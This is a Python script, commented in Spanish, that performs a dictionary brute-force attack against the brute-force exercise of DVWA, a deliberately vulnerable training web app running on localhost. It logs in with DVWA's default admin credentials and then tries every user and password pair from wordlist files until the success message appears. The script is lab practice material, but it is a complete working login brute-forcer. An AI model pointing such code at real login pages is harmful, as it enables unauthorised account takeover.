import requests

# URL de DVWA y la URL de login
base_url = 'http://localhost:8080'
login_url = f'{base_url}/login.php'
brute_url = f'{base_url}/vulnerabilities/brute/'

# Archivos de texto con usuarios y contraseñas
users_file = 'userlist.txt'
passwords_file = 'passwordlist.txt'

# Cabeceras HTTP a utilizar para la solicitud
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# Función para leer líneas de archivos de texto
def read_lines(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Función para realizar login y obtener cookies, incluyendo PHPSESSID
def get_session():
    login_data = {
        'username': 'admin',  # Coloca el usuario con el que inicias sesión en DVWA
        'password': 'password',  # Coloca la contraseña correcta
        'Login': 'Login'
    }
    
    # Hacemos la solicitud POST al formulario de login
    session = requests.Session()  # Mantenemos la sesión para almacenar las cookies
    response = session.post(login_url, headers=headers, params=login_data)
    
    # Verificamos si el login fue exitoso
    if 'Welcome' in response.text:
        print('[INFO] Sesión iniciada correctamente')
    else:
        print('[ERROR] Fallo al iniciar sesión')
    
    # Devolvemos la sesión con las cookies (incluyendo PHPSESSID)
    return session

# Función para realizar el ataque de fuerza bruta
def brute_force_attack(session):
    users = read_lines(users_file)
    passwords = read_lines(passwords_file)
    
    for username in users:
        for password in passwords:
            data = {
                'username': username,
                'password': password,
                'Login': 'Login'
            }
            
            # Realizamos la solicitud POST para probar usuario/contraseña
            response = session.post(brute_url, headers=headers, params=data)
            
            # Verificamos el contenido de la página para encontrar el mensaje correcto
            if 'Welcome to the password protected area' in response.text:
                print(f'[SUCCESS] Usuario: {username} Contraseña: {password}')
                return  # Salimos después de encontrar la combinación correcta
            else:
                print(f'[FAILED] Usuario: {username} Contraseña: {password}')

# Ejecutar el ataque de fuerza bruta
session = get_session()  # Obtenemos la sesión con PHPSESSID
brute_force_attack(session)  # Usamos esa sesión en el ataque
